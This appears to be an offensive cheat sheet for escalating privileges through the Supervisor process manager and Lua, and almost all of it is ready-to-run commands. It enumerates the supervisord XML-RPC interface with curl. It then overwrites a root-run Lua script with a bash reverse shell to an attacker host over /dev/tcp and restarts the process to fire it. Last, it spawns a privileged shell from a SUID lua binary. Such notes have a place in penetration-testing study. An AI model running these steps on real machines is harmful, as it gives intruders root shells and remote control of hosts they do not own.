# Supervisor Process Manager Lua RCE

Supervisor (process manager, default port 9001) may run scripts with SUID bits or privileged wrappers. If the supervisor configuration allows editing or restarting processes running as root, and those processes execute user-controlled content (e.g., Lua scripts, shell scripts), it leads to privilege escalation or RCE.

## Enumerate Supervisor

```bash
# Check supervisord web interface
curl http://<TARGET>:9001/

# RPC API - list processes
curl -X POST http://<TARGET>:9001/RPC2 \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>supervisor.getAllProcessInfo</methodName><params></params></methodCall>'
```

## Exploit via Writable Lua Script

```bash
# If a supervisor-managed process runs a Lua script you can write:
# 1. Edit the Lua script to add a reverse shell
cat > /path/to/script.lua << 'EOF'
os.execute("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'")
EOF

# 2. Restart the process via supervisor (if you have supervisor access)
supervisorctl restart <process_name>
# Or via HTTP API
curl -X POST http://localhost:9001/RPC2 \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>supervisor.stopProcess</methodName><params><param><value>process_name</value></param></params></methodCall>'
```

## SUID Lua Binary

```bash
# If lua binary is SUID
find / -perm -4000 -name "lua*" 2>/dev/null

# Execute shell
lua -e 'os.execute("/bin/bash -p")'
```

## Notes
- Supervisor config: `/etc/supervisor/supervisord.conf`, `/etc/supervisor/conf.d/*.conf`
- Look for processes running as root with user-writable script paths
- Port 9001 may require credentials — check config for `[inet_http_server]` username/password
- Lua `os.execute()` runs commands in shell context of the Lua process owner
